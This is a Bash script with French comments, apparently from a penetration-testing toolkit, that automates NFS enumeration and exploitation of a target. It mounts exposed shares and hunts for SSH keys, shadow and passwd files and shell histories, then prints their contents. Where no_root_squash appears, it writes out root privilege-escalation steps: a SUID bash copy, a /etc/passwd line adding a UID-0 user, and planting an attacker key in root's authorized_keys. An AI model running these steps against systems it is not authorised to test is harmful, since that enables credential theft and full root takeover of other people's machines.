#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — NFS (2049/111)        ║
# ║   Usage: ./enum_nfs.sh <TARGET>     ║
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"

require_target "$TARGET"
banner "NFS (port 2049 / RPCbind 111)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "nfs")

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT / RPCBIND"

run "Nmap — NFS + RPCbind" "$OUTDIR/nmap_nfs.txt" \
    nmap -sV -sC "$TARGET" -p111,2049 \
    --script nfs-ls,nfs-showmount,nfs-statfs,rpcinfo \
    -oN "$OUTDIR/nmap_nfs_raw.txt"

# rpcinfo pour lister tous les services RPC
info "rpcinfo — liste des services RPC"
timeout 15 rpcinfo -p "$TARGET" 2>&1 | tee "$OUTDIR/rpcinfo.txt"

# ─── 2. SHOWMOUNT ───────────────────────────────────────────
section "2. EXPORTS NFS (showmount)"

run "showmount -e" "$OUTDIR/showmount.txt" \
    showmount -e "$TARGET"

# Extraire les exports
EXPORTS=$(grep -v "^Export\|^Exports\|^clnt_create" "$OUTDIR/showmount.txt" 2>/dev/null)

if [[ -z "$EXPORTS" ]]; then
    warn "Aucun export NFS trouvé ou showmount bloqué"
    info "Essai via nmap script..."
    grep -A 100 "nfs-showmount\|nfs-ls" "$OUTDIR/nmap_nfs.txt" 2>/dev/null | head -30
    summary "$OUTDIR"
    exit 0
fi

finding "Exports NFS trouvés :"
echo "$EXPORTS" | while read -r line; do
    success "  $line"
done

# Check no_root_squash
if echo "$EXPORTS" | grep -q "no_root_squash\|*\|0\.0\.0\.0"; then
    warn "Export public ou no_root_squash détecté !"
    echo "POSSIBLE_NO_ROOT_SQUASH" >> "$OUTDIR/findings.txt"
fi

# ─── 3. MONTAGE ET ENUM ─────────────────────────────────────
section "3. MONTAGE ET ÉNUMÉRATION"

MOUNT_BASE="/tmp/nfs_mount_$(date +%s)"
mkdir -p "$MOUNT_BASE"

MOUNTED_SHARES=()

while IFS= read -r export_line; do
    SHARE=$(echo "$export_line" | awk '{print $1}')
    [[ -z "$SHARE" || "$SHARE" == "Export" ]] && continue

    MOUNT_POINT="${MOUNT_BASE}${SHARE//\//_}"
    mkdir -p "$MOUNT_POINT"

    info "Montage : $TARGET:$SHARE → $MOUNT_POINT"
    if timeout 15 sudo mount -t nfs -o ro,nolock,vers=3 \
        "${TARGET}:${SHARE}" "$MOUNT_POINT" 2>&1; then
        success "Montage réussi : $SHARE"
        MOUNTED_SHARES+=("$MOUNT_POINT:$SHARE")
    elif timeout 15 sudo mount -t nfs -o ro,nolock \
        "${TARGET}:${SHARE}" "$MOUNT_POINT" 2>&1; then
        success "Montage réussi (v4) : $SHARE"
        MOUNTED_SHARES+=("$MOUNT_POINT:$SHARE")
    else
        error "Montage échoué : $SHARE"
    fi
done < <(echo "$EXPORTS")

# Enum sur les shares montés
for entry in "${MOUNTED_SHARES[@]}"; do
    MP="${entry%%:*}"
    SHARE="${entry##*:}"

    info "Listing de $SHARE"
    find "$MP" 2>/dev/null | head -200 | tee "$OUTDIR/listing_${SHARE//\//_}.txt"

    # Fichiers intéressants
    section "Fichiers sensibles dans $SHARE"
    find "$MP" -type f \( \
        -name "*.txt" -o -name "*.conf" -o -name "*.cfg" \
        -o -name "*.sh" -o -name "*.py" -o -name "*.php" \
        -o -name "*.key" -o -name "*.pem" -o -name "*.pfx" \
        -o -name "id_rsa" -o -name "id_dsa" -o -name "*.id_rsa" \
        -o -name ".ssh" -o -name "authorized_keys" \
        -o -name "shadow" -o -name "passwd" \
        -o -name ".bash_history" -o -name ".zsh_history" \
        -o -name "*.bak" -o -name "*.sql" \
    \) 2>/dev/null | tee "$OUTDIR/interesting_${SHARE//\//_}.txt"

    # Lire les fichiers intéressants
    while IFS= read -r f; do
        SIZE=$(stat -c%s "$f" 2>/dev/null || echo 0)
        [[ "$SIZE" -lt 100000 ]] && {
            finding "Contenu de $f :"
            cat "$f" 2>/dev/null | head -50 | tee -a "$OUTDIR/file_contents.txt"
            echo "---" >> "$OUTDIR/file_contents.txt"
        }
    done < "$OUTDIR/interesting_${SHARE//\//_}.txt"

    # Détecter SUID/SGID
    info "Fichiers SUID/SGID dans $SHARE"
    find "$MP" -perm /4000 -o -perm /2000 2>/dev/null | \
        tee "$OUTDIR/suid_${SHARE//\//_}.txt"

    # Permissions sur le répertoire root du share
    ls -la "$MP" 2>/dev/null | tee "$OUTDIR/root_perms_${SHARE//\//_}.txt"

    # UID du propriétaire du répertoire
    ROOT_UID=$(stat -c%u "$MP" 2>/dev/null)
    if [[ "$ROOT_UID" == "0" ]]; then
        warn "Répertoire root owned (UID=0) — test no_root_squash !"
        echo "ROOT_OWNED_$SHARE" >> "$OUTDIR/findings.txt"
    fi
done

# ─── 4. EXPLOIT NO_ROOT_SQUASH ──────────────────────────────
section "4. EXPLOITATION NO_ROOT_SQUASH"

NO_SQUASH=$(grep "no_root_squash" "$OUTDIR/findings.txt" 2>/dev/null)
ROOT_OWNED=$(grep "ROOT_OWNED" "$OUTDIR/findings.txt" 2>/dev/null)

if [[ -n "$NO_SQUASH" ]] || [[ -n "$ROOT_OWNED" ]]; then
    warn "no_root_squash possible — instructions d'exploitation :"

    for entry in "${MOUNTED_SHARES[@]}"; do
        MP="${entry%%:*}"
        SHARE="${entry##*:}"

        if [[ "$(stat -c%u "$MP" 2>/dev/null)" == "0" ]] || [[ -n "$NO_SQUASH" ]]; then
            cat >> "$OUTDIR/exploit_guide.txt" << EXPLOIT_GUIDE
=== EXPLOIT no_root_squash pour $SHARE ===

# Méthode 1 : SUID bash
sudo cp /bin/bash "${MP}/bash_suid"
sudo chmod +s "${MP}/bash_suid"
# Sur la cible (si accès SSH/RCE) :
#   ${SHARE}/bash_suid -p
#   id  → root

# Méthode 2 : Copier /etc/passwd modifié
sudo cp /etc/passwd /tmp/passwd_mod
# Ajouter : newroot:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash
# Puis :
# sudo cp /tmp/passwd_mod "${MP}/../etc/passwd"

# Méthode 3 : Authorized_keys (si .ssh/ accessible)
# sudo mkdir -p "${MP}/root/.ssh"
# sudo cp ~/.ssh/id_rsa.pub "${MP}/root/.ssh/authorized_keys"
# sudo chmod 700 "${MP}/root/.ssh"
# sudo chmod 600 "${MP}/root/.ssh/authorized_keys"
# ssh root@$TARGET

EXPLOIT_GUIDE
            finding "Guide d'exploit no_root_squash créé : $OUTDIR/exploit_guide.txt"
            cat "$OUTDIR/exploit_guide.txt"
        fi
    done
else
    info "Pas de no_root_squash détecté"
fi

# ─── 5. CLEANUP ─────────────────────────────────────────────
section "5. DÉMONTAGE"

for entry in "${MOUNTED_SHARES[@]}"; do
    MP="${entry%%:*}"
    info "Démontage : $MP"
    sudo umount "$MP" 2>/dev/null || sudo umount -f "$MP" 2>/dev/null
    rmdir "$MP" 2>/dev/null
done
rmdir "$MOUNT_BASE" 2>/dev/null

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
info "Exports NFS :"
cat "$OUTDIR/showmount.txt" 2>/dev/null

[[ -s "$OUTDIR/interesting_"*".txt" ]] && {
    echo ""
    success "Fichiers intéressants :"
    cat "$OUTDIR/interesting_"*".txt" 2>/dev/null
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
